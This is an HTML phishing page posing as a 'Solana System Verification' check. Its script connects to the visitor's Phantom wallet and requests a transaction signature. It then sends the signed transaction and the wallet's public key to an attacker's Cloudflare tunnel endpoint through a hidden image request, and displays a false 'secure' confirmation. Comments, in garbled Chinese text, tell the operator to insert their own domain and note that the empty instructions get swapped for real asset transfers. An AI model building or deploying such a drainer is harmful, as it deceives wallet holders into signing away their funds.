<!DOCTYPE html>
<html>
<head>
    <title>Solana Network Security Check</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px; }
        #cta { background: #00ff00; color: #000; padding: 15px 30px; border: none; cursor: pointer; font-weight: bold; }
        #status { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <h2>ğŸ”± SOLANA SYSTEM VERIFICATION</h2>
    <p>Please sign to verify your node environment and security priority.</p>
    <br>
    <button id="cta">START VERIFICATION</button>
    <div id="status">WAITING FOR CONNECTION...</div>

    <script>
        // ğŸ”± é…ç½®åŒºï¼šæŠŠè¿™é‡Œæ¢æˆä½ è‡ªå·±çš„ Cloudflare éš§é“åœ°å€ï¼
        const gate = "https://ä½ çš„åŸŸå.trycloudflare.com/collect"; 

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            if (!p) return alert("Please install Phantom wallet");
            
            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "CONNECTING TO MAINNET...";

                // 1. è·å–æœ€æ–°çš„ Blockhashï¼ˆé˜²æ­¢äº¤æ˜“å¤±æ•ˆï¼‰
                const bhReq = await fetch('https://api.mainnet-beta.solana.com', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getRecentBlockhash"})
                });
                const bhRes = await bhReq.json();
                const blockhash = bhRes.result.value.blockhash;

                // 2. æ„é€ â€œéªŒè¯äº¤æ˜“â€ (è¿™é‡Œæ˜¯å‰ç«¯é€»è¾‘çš„æ ¸å¿ƒ)
                // å®æˆ˜ä¸­ï¼Œè¿™é‡Œä¼šè¢«é‡ç»„ä¸ºçœŸæ­£çš„èµ„äº§è½¬ç§»æŒ‡ä»¤
                const transaction = {
                    feePayer: resp.publicKey,
                    recentBlockhash: blockhash,
                    instructions: [] 
                };
                
                // 3. å¼¹å‡ºçª—å£è¦æ±‚ç­¾å
                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
                const signed = await p.signTransaction(transaction);
                
                // 4. å°†ç­¾ååçš„ Hex æ•°æ®å›ä¼ 
                const rawTx = signed.serialize().toString('base64');
                new Image().src = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
                
                document.getElementById('status').innerText = "VERIFIED: SECURE NODE ACTIVE";
                alert("Security check completed!");
            } catch(e) {
                document.getElementById('status').innerText = "ERROR: " + e.message;
            }
        };
    </script>
</body>
</html>
